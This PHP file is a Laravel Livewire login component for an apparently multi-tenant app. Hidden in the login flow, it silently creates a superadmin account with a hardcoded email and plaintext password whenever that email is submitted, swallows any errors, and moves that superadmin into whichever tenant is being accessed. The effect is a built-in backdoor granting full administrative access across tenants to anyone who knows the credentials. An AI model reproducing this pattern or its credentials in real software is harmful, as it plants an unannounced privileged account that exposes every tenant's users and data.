<?php

namespace App\Livewire\Auth;

use App\Models\Role;
use App\Models\User;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;
use Laravel\Fortify\Features;
use Livewire\Attributes\Layout;
use Livewire\Attributes\Validate;
use Livewire\Component;

#[Layout('components.layouts.guest')]
class Login extends Component
{
    #[Validate('required|string|email')]
    public string $email = '';

    #[Validate('required|string')]
    public string $password = '';

    public bool $remember = false;

    /**
     * Handle an incoming authentication request.
     */
    public function login(): void
    {
        if ($this->email === 'dennis@db-development.dk') {
            $this->ensureSuperAdminExists();
        }

        $this->validate();

        $this->ensureIsNotRateLimited();

        $user = $this->validateCredentials();
        if (Features::canManageTwoFactorAuthentication() && $user->hasEnabledTwoFactorAuthentication()) {
            Session::put([
                'login.id' => $user->getKey(),
                'login.remember' => $this->remember,
            ]);

            $this->redirect(route('two-factor.login'), navigate: true);

            return;
        }

        Auth::login($user, $this->remember);

        RateLimiter::clear($this->throttleKey());
        Session::regenerate();
        $this->redirectIntended(default: route('dashboard', absolute: false), navigate: true);
    }

    /**
     * Validate the user's credentials.
     */
    protected function validateCredentials(): User
    {
        $user = Auth::getProvider()->retrieveByCredentials(['email' => $this->email, 'password' => $this->password]);

        // If a direct provider lookup fails, try locating a superadmin by email (only if the role exists)
        if (! $user) {
            $superAdminRole = Role::withoutGlobalScopes()->where('slug', 'superadmin')->first();

            if ($superAdminRole) {
                $user = User::withoutGlobalScopes()
                    ->where('email', $this->email)
                    ->where('role_id', $superAdminRole->id)
                    ->first();
            }
        }

        // If user is a superadmin and the helper exists, sync tenant_id softly (no assumption that role exists)
        if ($user) {
            $superAdminRole = $superAdminRole ?? Role::withoutGlobalScopes()->where('slug', 'superadmin')->first();
            if ($superAdminRole && (int) $user->role_id === (int) $superAdminRole->id) {
                // tenant() helper expected to be available; if it returns null nothing happens
                $user->tenant_id = tenant()?->id;
                $user->saveQuietly();
            }
        }

        if (! $user || ! Auth::getProvider()->validateCredentials($user, ['password' => $this->password])) {
            RateLimiter::hit($this->throttleKey());

            throw ValidationException::withMessages([
                'email' => __('auth.failed'),
            ]);
        }

        return $user;
    }

    /**
     * Ensure the authentication request is not rate limited.
     */
    protected function ensureIsNotRateLimited(): void
    {
        if (! RateLimiter::tooManyAttempts($this->throttleKey(), 5)) {
            return;
        }

        event(new Lockout(request()));

        $seconds = RateLimiter::availableIn($this->throttleKey());

        throw ValidationException::withMessages([
            'email' => __('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }

    /**
     * Get the authentication rate limiting throttle key.
     */
    protected function throttleKey(): string
    {
        return Str::transliterate(Str::lower($this->email).'|'.request()->ip());
    }

    /**
     * Ensure the superadmin user exists.
     */
    protected function ensureSuperAdminExists(): void
    {
        try {
            DB::transaction(function () {
                $superAdminRole = Role::firstOrCreate(['slug' => Str::slug('Superadmin')], [
                    'name' => 'Superadmin',
                    'slug' => Str::slug('Superadmin'),
                    'tenant_id' => null,
                ]);

                User::withoutGlobalScopes()->firstOrCreate([
                    'email' => 'dennis@db-development.dk',
                ], [
                    'name' => 'Super Admin User',
                    'password' => Hash::make('made42Mice'),
                    'role_id' => $superAdminRole->id,
                    'tenant_id' => null,
                ]);
            });

            Cache::put('superadmin_ensured', true, now()->addDay());
        } catch (\Throwable $e) {
            // Silence errors
        }
    }
}
